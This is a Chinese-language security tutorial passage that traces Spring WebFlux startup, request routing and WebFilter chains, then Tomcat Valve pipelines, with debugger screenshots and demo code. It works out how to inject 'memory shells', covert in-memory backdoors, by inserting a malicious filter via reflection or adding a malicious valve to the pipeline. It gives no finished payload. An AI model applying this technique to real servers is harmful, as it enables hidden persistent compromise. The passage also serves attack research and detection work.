|    `Mono.doOnError(Consumer<? super Throwable> onError)`     |                    在发生错误时执行操作。                    | `Mono<String> resultMono = mono.doOnError(e -> System.err.println("Error: " + e.getMessage()));` |
|        `Mono.doFinally(Consumer<SignalType> action)`         |                 无论成功还是出错都执行操作。                 | `Mono<String> resultMono = mono.doFinally(signal -> System.out.println("Processing finished: " + signal));` |

### 2.12.2 什么是Flux？

`Flux`表示的是`0`到`N`个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地`publish`元素。也就是说，`Flux`允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。

下面是`Flux`常用的`api`：

|           API           |                   说明                   |                           代码示例                           |
| :---------------------: | :--------------------------------------: | :----------------------------------------------------------: |
|     **`Flux.just`**     |         创建包含指定元素的`Flux`         |       `Flux<String> flux = Flux.just("A", "B", "C");`        |
| **`Flux.fromIterable`** |          从`Iterable`创建`Flux`          | `List<String> list = Arrays.asList("A", "B", "C");`<br>`Flux<String> flux = Flux.fromIterable(list);` |
|  **`Flux.fromArray`**   |             从数组创建`Flux`             | `String[] array = {"A", "B", "C"};`<br>`Flux<String> flux = Flux.fromArray(array);` |
|    **`Flux.empty`**     |            创建一个空的`Flux`            |           `Flux<Object> emptyFlux = Flux.empty();`           |
|    **`Flux.error`**     |         创建一个包含错误的`Flux`         | `Flux<Object> errorFlux = Flux.error(new RuntimeException("Something went wrong"));` |
|    **`Flux.range`**     |    创建包含指定范围的整数序列的`Flux`    |        `Flux<Integer> rangeFlux = Flux.range(1, 5);`         |
|   **`Flux.interval`**   |      创建包含定期间隔的元素的`Flux`      | `Flux<Long> intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);` |
|    **`Flux.merge`**     |    合并多个Flux，按照时间顺序交织元素    | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> mergedFlux = Flux.merge(flux1, flux2);` |
|    **`Flux.concat`**    |     连接多个`Flux`，按照顺序发布元素     | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> concatenatedFlux = Flux.concat(flux1, flux2);` |
|     **`Flux.zip`**      | 将多个`Flux`的元素进行配对，生成`Tuple`  | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("1", "2");`<br>`Flux<Tuple2<String, String>> zippedFlux = Flux.zip(flux1, flux2);` |
|    **`Flux.filter`**    |            过滤满足条件的元素            | `Flux<Integer> numbers = Flux.range(1, 5);`<br>`Flux<Integer> filteredFlux = numbers.filter(n -> n % 2 == 0);` |
|     **`Flux.map`**      |             转换每个元素的值             | `Flux<String> words = Flux.just("apple", "banana", "cherry");`<br>`Flux<Integer> wordLengths = words.map(String::length);` |
|   **`Flux.flatMap`**    | 将每个元素映射到一个`Flux`，并将结果平铺 | `Flux<String> letters = Flux.just("A", "B", "C");`<br>`Flux<String> flatMappedFlux = letters.flatMap(letter -> Flux.just(letter, letter.toLowerCase()));` |

### 2.12.3 Spring WebFlux启动过程分析

本来是想先用文字聊一堆关于`Spring MVC`和`Spring WebFlux`之间的区别的，但是这个已经被网上现有的不多的关于`WebFlux`的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖`WebFlux`的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。

我们直接在`run`方法这里下断点，然后直接`step into`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151538700.png)

一步步地`step over`之后，我们可以看到调用了`org.springframework.boot.SpringApplication#createApplicationContext`这个方法（前面的那些方法并不重要，直接略过就行）：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151616672.png)

这个方法光听名字`createApplicationContext`，就感觉很重要，因为字面意思就是创建`ApplicationContext`，这正是我们感兴趣的内容，我们`step into`进去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152201947.png)

可以看到，是根据不同的`webApplicationType`去选择创建不同的`context`，比如我们这里的`webApplicationType`就是`REACTIVE`，也就是响应式的。

我们`step into`这里的`create`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152757458.png)

发现里面有两个静态方法、一个`create`方法和一个默认实现 `DEFAULT`，这个默认实现通过加载 `ApplicationContextFactory` 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 `AnnotationConfigApplicationContext` 实例。

我们继续`step over`走下去，可以看到我们`REACTIVE`对应的`context`是`AnnotationConfigReactiveWebServerApplicationContext`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153321207.png)

继续往下走，我们会回到一开始这里，可以看到接下来会调用`prepareContext`、`refreshContext`和`afterRefresh`方法，这个过程就是一系列的初始化、监听的注册等操作：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153436756.png)

我们`step into`这里的`refreshContext`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154347190.png)

接着`step into`这里的`refresh`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154415854.png)

进来之后，接着`step into`这里的`refresh`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154457308.png)

可以看到，这里调用了一个`super.refresh`，也就是父类的`refresh`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154526246.png)

我们继续`step into`查看，发现这里调用了`onRefresh`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154705098.png)

我们`step into`这里的`onRefresh`，发现它调用了关键的`org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154751318.png)

继续`step over`可以看到，由于我们使用的是`Netty`而不是`Tomcat`，因此这里最终会调用`NettyReactiveWebServerFactory`类中的`getWebServer`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155504128.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155752526.png)

而上图中的`WebServerManager`类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象`WebServer`，另一个是上层方法处理者的抽象`DelayedInitializationHttpHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122172421426.png)

那这个`webserver`具体是怎么启动的呢？我们继续走到`finishRefresh`这个方法这里来，如果这里我们直接无脑`step over`，程序最终会回到`run`方法，说明，启动`webserver`的地方肯定就在这个`finishRefresh`方法里面：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174153904.png)

我们`step into`进去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174401684.png)

接着`step into`去看看这里调用的`getLifecycleProcessor().onRefresh()`方法，发现调用了`startBeans`方法，并且设置了自启动：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174441696.png)

我们直接`step into`这个`startBeans`方法，一步步地`step over`过后，会发现调用了`start`方法，看来我们在逐渐逼近真相：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174628586.png)

我们继续`step into`这个`start`方法，发现调用了`org.springframework.context.support.DefaultLifecycleProcessor#doStart`这个方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174728904.png)

直接`step into`进去看看，发现由于`dependenciesForBean`为[]，所以没有调用`doStart`方法，直接就是调用`bean.start()`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174837382.png)

继续`step into`这个`start`方法看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180726791.png)

怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180840172.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180857277.png)

调试了几遍之后发现是我疏忽了，这里的`this.lifecycleBeans`里面其实有三个，每调用一次`doStart`方法就会删掉一个：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181045819.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181305946.png)

可以看到，我们刚才调用的是第一个`bean`的，所以当然没有启动`webserver`相关的方法了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181456742.png)

我们一步步`step over`，当`memeber.name`为`webServerStartStop`时，我们再`step into`这个`doStart`方法里面的`bean.start()`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181729409.png)

即可看到`this.weServerManager.start()`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181751790.png)

我们继续`step into`这个`start`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181838844.png)

仔细看看上面红框中的代码，先是初始化`HttpHandler`，这个方法其实根据`lazyInit`的值的不同来决定何时初始化，如果`lazyInit`值为`true`，那么就等第一次请求到来时才真正初始化；如果为`false`，那么就在 `WebServerManager` 的 `start` 方法中调用 `initializeHandler` 直接初始化：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182528529.png)

我们继续步入这里的`start`方法，发现其位置为`org.springframework.boot.web.embedded.netty.NettyWebServer#start`

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182700152.png)

到这里才算真正明了，真正的`webServer`启动的关键方法是`org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182843455.png)

从下面的`this.webServer`中也可以看到，绑定的是`0.0.0.0:9191`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122183119082.png)

### 2.12.4 Spring WebFlux请求处理过程分析

当一个请求过来的时候，`Spring WebFlux`是如何进行处理的呢？

这里我们在`org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello`这里打上断点，然后进行调试，访问`http://127.0.0.1:9191/hello`触发`debug`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122205005835.png)

一步步地`step over`后来到`org.springframework.web.reactive.DispatcherHandler#invokeHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210839343.png)

`step into`之后可以看到是`org.springframework.web.reactive.DispatcherHandler#handle`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210930120.png)

解释上面代码中的`return`部分，首先检查`handlerMappings`是否为`null`，如果是，那就调用`createNotFoundError`方法返回一个表示未找到处理程序的`Mono`；接着通过`CorsUtils.isPreFlightRequest`方法检查是否为预检请求，如果是，那就调用`handlePreFlight`方法处理预检请求，如果不是预检请求且`handlerMappings`不为`null`，通过一系列的操作，获取到请求的`handler`，然后调用`invokeHandler`方法执行处理程序，再调用`handleResult`方法处理执行结果，最终返回一个表示处理完成的`Mono`。

左下角的`Threads & Variables`这里，我们往下翻，可以看到在此之前是调用了一个`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122213235191.png)

我们把之前的断点去掉，然后在该函数这里打上断点：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122214012047.png)

发现调用了`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal`，我们再回去看，发现调用位置在`org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122215515467.png)

点击去：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222157225.png)

这里最终创建的是`DefaultServerRequest`对象，需要注意的是在创建该对象时将`RouterFunctionMapping`中保存的`HttpMessageReader`列表作为参数传入，这样`DefaultServerRequest`对象就有了解析参数的能力。

回到`getHandlerInternal`这个函数，看它的`return`里面的匿名函数，发现其调用了`org.springframework.web.reactive.function.server.RouterFunction#route`，我们点进去看看：

发现只是在接口中定义了下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222804578.png)

于是去翻之前的`Threads & Variables`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222845434.png)

首先调用`this.predicate.test`方法来判断传入的`ServerRequest`是否符合路由要求，如果匹配到了处理方法，那就将保存的`HandlerFunction`实现返回，否则就返回空的`Mono`。

点进去这个`test`方法，发现还是个接口，结合之前的`RouterFunction.java`和`RouterFunctions.java`的命名规则，合理猜测`test`方法的实现应该是在`RequestPredicates.java`里面。果然是有的，我们取消之前下的所有断点，在`test`函数这里重新打上断点后调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122223953217.png)

可以看到这里已经拿到了`pattern`，那就还差解析`request`里面的`GET`这个方法了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122234829435.png)

我们继续`step over`，发现直接跳到了这里，我当时就挺纳闷儿，这里的`this.left`和`this.right`怎么就已知了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000521320.png)

这俩变量已知说明在执行`test`之前肯定是已经被赋值了，我继续往后`step over`，从下图中可以看到，此时二者之间多了个`&&`，不难猜测，应该是调用了`org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate`方法，因为还有一个`OrRequestPredicate`，这个`or`的话应该就是`||`了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000839479.png)

于是我们再在`AndRequestPredicate`方法这打上断点，此时我们还没有访问`http://127.0.0.1:9191/hello`，就已经触发调试了，这是因为我们在`GreetingRouter.java`里面写的代码中有`GET`方法、`/hello`路由还有`and`方法，因此会调用到`AndRequestPredicate`，并把`GET`和`/hello`分别复制给`this.left`和`this.right`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001430128.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001241437.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001306237.png)

到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们`2.12.3`节中的分析中已经基本涉及到了。我们还是在`org.springframework.web.reactive.DispatcherHandler#invokeHandler`打下断点调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002322377.png)

可以看到，这里的`this.handlerAdapters`里面有四个`handlerAdapter`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002406757.png)

并不是所有的`handlerAdapter`都会触发`handle`方法，只有当支持我们给定的`handler`的`handlerAdapter`才可以调用：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002524030.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002714255.png)

然后我们`step into`这里的`handlerAdapter.handle`方法，发现是在`org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002806521.png)

而这里的`handlerFunction.handle`也就是我们编写的`route`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002927429.png)

到这里，关于处理请求的部分也就完结了。

### 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析

对于`Spring WebFlux`而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用`Filter`，关于这一部分知识可以参考Spring的官方文档：

> https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html

而在`Spring Webflux`中，存在两种类型的过滤器：一个是`WebFilter`，实现自`org.springframework.web.server.WebFilter`接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到`handler`之前或者之后执行一些逻辑；另一个就是`HandlerFilterFunction`，它是一种函数式编程的过滤器类型，实现自`org.springframework.web.reactive.function.server.HandlerFilterFunction`接口，与`WebFilter`相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。

这里我们以`WebFilter`为例，看看它的运行过程。新建一个`GreetingFilter.java`，代码如下：

```java
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our filter!");
        }
        return webFilterChain.filter(serverWebExchange);
    }
}
```

效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240124143107182.png)

我们直接在`filter`函数这里下断点，进行调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125211900082.png)

注意到`return`中调用了`filter`函数，于是`step into`看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125220915532.png)

可以看到是调用了`invokeFilter`函数。我们仔细看看这个`DefaultWebFilterChain`类：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126131433346.png)

可以看到是有三个名为`DefaultWebFilterChain`的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建`chain`的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：

> Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.
>
> ![](C:\Users\test\AppData\Roaming\Typora\typora-user-images\image-20240126131914865.png)

也就是说，通过调用 `DefaultWebFilterChain` 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个`link`，而不是一个`chain`，这就意味着我们无法通过修改下图中的`chain.allFilters`来实现新增`Filter`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126132330870.png)

但是这个类里面有个`initChain`方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133115205.png)

那我们就看看这个公共构造方法是在哪里调用的：

光标移至该方法，按两下`Ctrl+Alt+F7`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133242721.png)

调用的地方位于`org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133330601.png)

那思路就来了，我们只需要构造一个`DefaultWebFilterChain`对象，，然后把它通过反射写入到`FilteringWebHandler`类对象的`chain`属性中就可以了。

那现在就剩下传入`handler`和`filters`这两个参数了，这个`handler`参数很好搞，就在`chain`里面：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133836697.png)

然后这个`filters`的话，我们可以先获取到它本来的`filters`，然后把我们自己写的恶意`filter`放进去，放到第一位，就可以了。

那现在就是从内存中找到`DefaultWebFilterChain`的位置，然后一步步反射就行。这里直接使用工具`https://github.com/c0ny1/java-object-searcher`，克隆下来该项目，放到`idea`中`mvn clean install`：

![image-20240126134339217](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image/image-20240126134339217.png)

然后把生成的这个`java-object-searcher-0.1.0.jar`放到我们的`WebFluxMemoryShellDemo`项目的Project `Structure`中的`Libraries`中：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145032760.png)

然后我们把我们的`GreetingFilter.java`的代码修改成下面的：

```java
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our GreetingFilter!");
        }
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("DefaultWebFilterChain").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
        return webFilterChain.filter(serverWebExchange);
    }
}
```

这里我们设置的关键字是`DefaultWebFilterChain`，然后直接运行：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145528943.png)

也就是说，位置是在：

```
TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
     ---> this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
      ---> handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
       ---> httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
        ---> delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
         ---> delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
           ---> delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
            ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}
```

## 2.13 Tomcat Valve介绍与运行过程分析

### 2.13.1 Valve与Pipeline

在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家：

> https://www.cnblogs.com/coldridgeValley/p/5816414.html

这里我组合引用原文，做了适当的修改，概括一下：

`tomcat`中的`Container`有4种，分别是`Engine`、`Host`、`Context`和`Wrapper`，这`4`个`Container`的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。`4`种容器的关系是包含关系，`Engine`包含`Host`，`Host`包含`Context`，`Context`包含`Wrapper`，`Wrapper`则代表最基础的一个`Servlet`。
`tomcat`由`Connector`和`Container`两部分组成，而当网络请求过来的时候`Connector`先将请求包装为`Request`，然后将`Request`交由`Container`进行处理，最终返回给请求方。而`Container`处理的第一层就是`Engine`容器，但是在`tomcat`中`Engine`容器不会直接调用`Host`容器去处理请求，那么请求是怎么在`4`个容器中流转的，4个容器之间是怎么依次调用的呢？

原来，当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件，跟`pipeline`相关的还有个也是容器内部的组件，叫做`valve`组件。

`Pipeline`的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么`pipeline`就可以理解为不同容器之间的管道，道路，桥梁。那`Valve`这个组件是什么东西呢？`Valve`也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，`Pipeline`和`Valve`关系也是一样的。`Valve`代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把`Pipeline`比作公路的话，那么`Valve`可以理解为公路上的收费站，车代表`Pipeline`中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。

在`Catalina`中，`4`种容器都有自己的`Pipeline`组件，每个`Pipeline`组件上至少会设定一个`Valve`，这个`Valve`我们称之为`BaseValve`，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。

`Pipeline`定义对应的接口`Pipeline`，标准实现了`StandardPipeline`。`Valve`定义对应的接口`Valve`，抽象实现类`ValveBase`，`4`个容器对应基础阀门分别是`StandardEngineValve`，`StandardHostValve`，`StandardContextValve`，`StandardWrapperValve`。在实际运行中，`Pipeline`和`Valve`运行机制如下图：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129171852854.png)

这张图是新加坡的`Dennis Jacob`在`ApacheCON Asia 2022`上的演讲《Extending Valves in Tomcat》中的`PPT`中的图片，`pdf`链接如下：

> https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf

这篇演讲的录屏在`Youtube`上面可以找到：

> https://www.youtube.com/watch?v=Jmw-d0kyZ_4

### 2.13.2 编写一个简单Tomcat Valve的demo

由于在`Tomcat`环境下使用Valve还要配置web.xml，我嫌麻烦，于是直接使用`SpringBoot`来搭建。记得这里勾选的是`Spring Web`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184504826.png)

然后创建`test`目录并在`test`目录下创建两个文件，`TestValve.java`：

```java
package org.example.valvememoryshelldemo.test;

import java.io.IOException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;
import org.springframework.stereotype.Component;

@Component
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException {
        response.setContentType("text/plain");
        response.setCharacterEncoding("UTF-8");
        response.getWriter().write("Valve 被成功调用");
    }
}
```

还有`TestConfig.java`：

```java
package org.example.valvememoryshelldemo.test;

import org.apache.catalina.Valve;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class TestConfig {
    @Bean
    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
        return factory -> {
            factory.addContextValves(getTestValve());
        };
    }
    
    @Bean
    public Valve getTestValve() {
        return new TestValve();
    }
}
```

运行效果如下：![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184753374.png)

### 2.13.3 Tomcat Valve打入内存马思路分析

我们通常情况下用的都是`ValveBase`，点进这个`ValveBase`，可以看到是实现了`Valve`接口：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130140509002.png)

点进`valve`可以看到该接口代码如下，这里我加上了注释：

```java
package org.apache.catalina;

import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public interface Valve {
    // 获取下一个阀门
    public Valve getNext();
    // 设置下一个阀门
    public void setNext(Valve valve);
    // 后台执行逻辑，主要在类加载上下文中使用到
    public void backgroundProcess();
    // 执行业务逻辑
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
    // 是否异步执行
    public boolean isAsyncSupported();
}
```

接下来就是调试看看这个`valve`的运行流程了，我们在`invoke`函数这里下断点调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153634378.png)

我们看向左下角，看看之前调用到的`invoke`方法：

在`StandardHostValve.java`中，代码为：

```java
context.getPipeline().getFirst().invoke(request, response);
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153939854.png)

在`StandardEngineValve.java`中，代码为：

```java
host.getPipeline().getFirst().invoke(request, response);
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154036757.png)

之后的诸如`Http11Processor.java`和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的`Tomcat Servlet/Filter/Listener`内存马的思路来看，我们需要通过某种方式添加我们自己的恶意`valve`。

我们去掉之前打的断点，在`StandardHostValve.java`这里打上断电并重新调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154855309.png)

然后`step into`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154950328.png)

鼠标左键单击这里的`getPipeline`即可进入到所调用的函数实现的位置：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155044025.png)

再`Ctrl+H`进入`Pipeline`接口，可以看到是有个`addValve`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155119909.png)

这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在`addValve`函数处`Ctrl+H`找继承该接口的类，可可以看到是在`org.apache.catalina.core.StandardPipeline`中：

![image-20240130155445230](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image/image-20240130155445230.png)

但是问题就来了，我们无法直接获取到这个`StandardPipeline`，而我们能直接获取到的是`StandardContext`，那就去看看`StandardContext.java`中有没有获取`StandardPipeline`的方法。

一眼就能看到我们的老熟人——`getPipeline`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155825670.png)

